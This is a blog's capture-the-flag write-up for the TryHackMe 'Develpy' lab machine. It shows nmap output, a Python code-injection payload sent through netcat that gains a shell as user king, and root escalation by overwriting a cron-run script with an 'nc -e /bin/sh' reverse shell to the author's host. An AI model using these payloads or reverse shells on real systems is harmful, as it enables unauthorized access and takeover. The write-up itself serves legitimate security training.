<!doctype html><html lang=en>
<head>
<title>
Develpy - Write Up ::
Lanfran02 - Blog — Where write-ups are made.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Level Creator     Here Medium stuxnet    Reconn As usual in the CTFs we ran nmap to see what ports are open
╰─ lanfran@parrot ❯ map 10.10.46.133 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 17:21 CEST Nmap scan report for 10.10.46.133 Host is up (0.10s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/posts/develpy/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/posts/develpy/cover.png">
<meta name=twitter:title content="Develpy - Write Up">
<meta name=twitter:description content="TryHackMe's medium level machine.">
<meta property="og:title" content="Develpy - Write Up">
<meta property="og:description" content="TryHackMe's medium level machine.">
<meta property="og:type" content="article">
<meta property="og:url" content="/posts/develpy/"><meta property="og:image" content="/posts/develpy/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-04T17:29:57+02:00">
<meta property="article:modified_time" content="2021-07-04T17:29:57+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/es/>Español</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/tags/hackthebox/>HTB</a></li>
<li><a href=/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/es/>Español</a></li>
<li><a href=/tags/hackthebox/>HTB</a></li>
<li><a href=/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Develpy - Write Up</h1>
<div class=post-meta>
<span class=post-date>
2021-07-04
</span>
<span class=post-author>— Written by Lanfran02</span>
<span class=post-read-time>— 5 min read</span>
</div>
<span class=post-tags>
<a href=/tags/nc/>#nc</a>&nbsp;
<a href=/tags/python/>#python</a>&nbsp;
<a href=/tags/cron/>#cron</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/posts/develpy/cover.png alt="Develpy - Write Up">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconn>Reconn</a></li>
<li><a href=#foothold---user>Foothold - User</a></li>
<li><a href=#root>Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Level</th>
<th>Creator</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/bsidesgtdevelpy>Here</a></td>
<td>Medium</td>
<td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td>
</tr>
</tbody>
</table>
<h2 id=reconn>Reconn</h2>
<p>As usual in the CTFs we ran nmap to see what ports are open</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.46.133                                                                                                                                                       ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-04 17:21 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.46.133
Host is up <span style=color:#f92672>(</span>0.10s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed ports
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
|     File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
|     num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
|     File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line <span style=color:#ae81ff>0</span>
|     SyntaxError: unexpected EOF <span style=color:#66d9ef>while</span> parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
|     File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
|     num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
|     File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
|     NameError: name <span style=color:#e6db74>&#39;GET&#39;</span> is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
|     File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
|     num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
|     File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
|     NameError: name <span style=color:#e6db74>&#39;OPTIONS&#39;</span> is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
<span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V<span style=color:#f92672>=</span>7.91%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>7/4%Time<span style=color:#f92672>=</span>60E1D1FC%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>NU
SF:LL,48,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x20
</span><span style=color:#e6db74>SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20&#34;</span><span style=color:#f92672>)</span>%r
SF:<span style=color:#f92672>(</span>GetRequest,136,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r
</span><span style=color:#e6db74>SF:\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\
</span><span style=color:#e6db74>SF:?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\
</span><span style=color:#e6db74>SF:x20\&#34;\./exploit\.py\&#34;,\x20line\x206,\x20in\x20&lt;module&gt;\r\n\x20\x20\x20\
</span><span style=color:#e6db74>SF:x20num_exploits\x20=\x20int\(input\(&#39;\x20Please\x20enther\x20number\x20
</span><span style=color:#e6db74>SF:of\x20exploits\x20to\x20send\?\?:\x20&#39;\)\)\r\n\x20\x20File\x20\&#34;&lt;string
</span><span style=color:#e6db74>SF:&gt;\&#34;,\x20line\x201,\x20in\x20&lt;module&gt;\r\nNameError:\x20name\x20&#39;GET&#39;\x20
</span><span style=color:#e6db74>SF:is\x20not\x20defined\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>HTTPOptions,13A,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\
</span><span style=color:#e6db74>SF:x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of
</span><span style=color:#e6db74>SF:\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20cal
</span><span style=color:#e6db74>SF:l\x20last\):\r\n\x20\x20File\x20\&#34;\./exploit\.py\&#34;,\x20line\x206,\x20in
</span><span style=color:#e6db74>SF:\x20&lt;module&gt;\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\(&#39;\x20P
</span><span style=color:#e6db74>SF:lease\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20&#39;\)\)
</span><span style=color:#e6db74>SF:\r\n\x20\x20File\x20\&#34;&lt;string&gt;\&#34;,\x20line\x201,\x20in\x20&lt;module&gt;\r\nNa
</span><span style=color:#e6db74>SF:meError:\x20name\x20&#39;OPTIONS&#39;\x20is\x20not\x20defined\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>RTSPReque
SF:st,13A,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
</span><span style=color:#e6db74>SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20Tra
</span><span style=color:#e6db74>SF:ceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\&#34;\./e
</span><span style=color:#e6db74>SF:xploit\.py\&#34;,\x20line\x206,\x20in\x20&lt;module&gt;\r\n\x20\x20\x20\x20num_ex
</span><span style=color:#e6db74>SF:ploits\x20=\x20int\(input\(&#39;\x20Please\x20enther\x20number\x20of\x20exp
</span><span style=color:#e6db74>SF:loits\x20to\x20send\?\?:\x20&#39;\)\)\r\n\x20\x20File\x20\&#34;&lt;string&gt;\&#34;,\x20l
</span><span style=color:#e6db74>SF:ine\x201,\x20in\x20&lt;module&gt;\r\nNameError:\x20name\x20&#39;OPTIONS&#39;\x20is\x2
</span><span style=color:#e6db74>SF:0not\x20defined\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>GenericLines,13B,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\x20\
</span><span style=color:#e6db74>SF:x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x20
</span><span style=color:#e6db74>SF:exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\x2
</span><span style=color:#e6db74>SF:0last\):\r\n\x20\x20File\x20\&#34;\./exploit\.py\&#34;,\x20line\x206,\x20in\x20
</span><span style=color:#e6db74>SF:&lt;module&gt;\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\(&#39;\x20Pleas
</span><span style=color:#e6db74>SF:e\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20&#39;\)\)\r\n
</span><span style=color:#e6db74>SF:\x20\x20File\x20\&#34;&lt;string&gt;\&#34;,\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20\
</span><span style=color:#e6db74>SF:x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing\
</span><span style=color:#e6db74>SF:r\n&#34;</span><span style=color:#f92672>)</span>;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 148.76 seconds
</code></pre></div><p>We found the port 10000 open, so we used <code>netcat</code> to see whats inside.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc 10.10.46.133 <span style=color:#ae81ff>10000</span>                                                                                          ─╯

        Private 0days

 Please enther number of exploits to send??: hello?
Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
  File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
    num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
  File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line <span style=color:#ae81ff>1</span>
    hello?
         ^
SyntaxError: unexpected EOF <span style=color:#66d9ef>while</span> parsing

</code></pre></div><p>It’s a python file running!</p>
<h2 id=foothold---user>Foothold - User</h2>
<p>Maybe we can use some python code to do RCE.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
╰─ lanfran@parrot ❯ nc 10.10.46.133 <span style=color:#ae81ff>10000</span>                                                                                         

        Private 0days

 Please enther number of exploits to send??: __import__<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)</span>.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ls -la; pwd&#39;</span><span style=color:#f92672>)</span>
total <span style=color:#ae81ff>324</span>
drwxr-xr-x <span style=color:#ae81ff>4</span> king king   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> .
drwxr-xr-x <span style=color:#ae81ff>3</span> root root   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> ..
-rw------- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>2929</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> .bash_history
-rw-r--r-- <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>220</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .bash_logout
-rw-r--r-- <span style=color:#ae81ff>1</span> king king   <span style=color:#ae81ff>3771</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .bashrc
drwx------ <span style=color:#ae81ff>2</span> king king   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .cache
-rwxrwxrwx <span style=color:#ae81ff>1</span> king king <span style=color:#ae81ff>272113</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> credentials.png
-rwxrwxrwx <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>408</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> exploit.py
drwxrwxr-x <span style=color:#ae81ff>2</span> king king   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .nano
-rw-rw-r-- <span style=color:#ae81ff>1</span> king king      <span style=color:#ae81ff>5</span> Jul  <span style=color:#ae81ff>4</span> 08:23 .pid
-rw-r--r-- <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>655</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .profile
-rw-r--r-- <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>32</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> root.sh
-rw-rw-r-- <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>139</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> run.sh
-rw-r--r-- <span style=color:#ae81ff>1</span> king king      <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .sudo_as_admin_successful
-rw-rw-r-- <span style=color:#ae81ff>1</span> king king     <span style=color:#ae81ff>33</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> user.txt
-rw-r--r-- <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>183</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .wget-hsts
/home/king

Exploit started, attacking target <span style=color:#f92672>(</span>tryhackme.com<span style=color:#f92672>)</span>...
</code></pre></div><p>Yes! It’s possible, let’s use it to get a reverse shell.</p>
<p><img src=user.png alt=User></p>
<p>Good! We are the user <em>King</em> and we can get the credentials of this user from the <code>credentials.png</code> file, but it’s not necessary.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ ls -la
ls -la
total <span style=color:#ae81ff>324</span>
drwxr-xr-x <span style=color:#ae81ff>4</span> king king   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> .
drwxr-xr-x <span style=color:#ae81ff>3</span> root root   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> ..
-rw------- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>2929</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> .bash_history
-rw-r--r-- <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>220</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .bash_logout
-rw-r--r-- <span style=color:#ae81ff>1</span> king king   <span style=color:#ae81ff>3771</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .bashrc
drwx------ <span style=color:#ae81ff>2</span> king king   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .cache
-rwxrwxrwx <span style=color:#ae81ff>1</span> king king <span style=color:#ae81ff>272113</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> credentials.png
-rwxrwxrwx <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>408</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> exploit.py
drwxrwxr-x <span style=color:#ae81ff>2</span> king king   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .nano
-rw-rw-r-- <span style=color:#ae81ff>1</span> king king      <span style=color:#ae81ff>5</span> Jul  <span style=color:#ae81ff>4</span> 08:26 .pid
-rw-r--r-- <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>655</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .profile
-rw-r--r-- <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>32</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> root.sh
-rw-rw-r-- <span style=color:#ae81ff>1</span> king king    <span style=color:#ae81ff>139</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> run.sh
-rw-r--r-- <span style=color:#ae81ff>1</span> king king      <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .sudo_as_admin_successful
-rw-rw-r-- <span style=color:#ae81ff>1</span> king king     <span style=color:#ae81ff>33</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> user.txt
-rw-r--r-- <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>183</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> .wget-hsts
king@ubuntu:~$ cat user.txt
cat user.txt
c<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span><span style=color:#ae81ff>9</span>
</code></pre></div><h2 id=root>Root</h2>
<p>To escalate to root, we digged into the machine, and found that root is running a cron job with the file <code>root.sh</code> inside <code>/home/king</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ ls -la root.sh
-rw-r--r-- <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>32</span> Aug <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2019</span> root.sh
</code></pre></div><p>So we modified that file to get a reverse shell.
But first we need to rename the original file to <code>root.sh.old</code>, because we can not edit ìt.
After doing that, we added the reverse shell code, and after a minute or so we get our reverse shell with root!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ echo <span style=color:#e6db74>&#34;nc -e /bin/sh 10.9.6.21 1338&#34;</span> &gt; root.sh
bash: root.sh: Permission denied
king@ubuntu:~$ mv root.sh root.sh.old
king@ubuntu:~$ echo <span style=color:#e6db74>&#34;nc -e /bin/sh 10.9.6.21 1338&#34;</span> &gt; root.sh
king@ubuntu:~$ cat root.sh
nc -e /bin/sh 10.9.6.21 <span style=color:#ae81ff>1338</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1338</span>                                                                                                  ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1338</span> ...
connect to <span style=color:#f92672>[</span>10.9.6.21<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.46.133<span style=color:#f92672>]</span> <span style=color:#ae81ff>38252</span>
id
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
whoami
root
cat /root/root.txt
9<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>c
</code></pre></div><p>And we rooted the machine!</p>
<p>That&rsquo;s all from my side, hope you find this helpful!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/posts/stuxctf/>
<span class=button__icon>←</span>
<span class=button__text>StuxCTF - Write Up</span>
</a>
</span>
<span class="button next">
<a href=/posts/jack-of-all-trades/>
<span class=button__text>Jack of All Trades - Write Up</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
<div id=hyvor-talk-view></div>
<script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
<script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>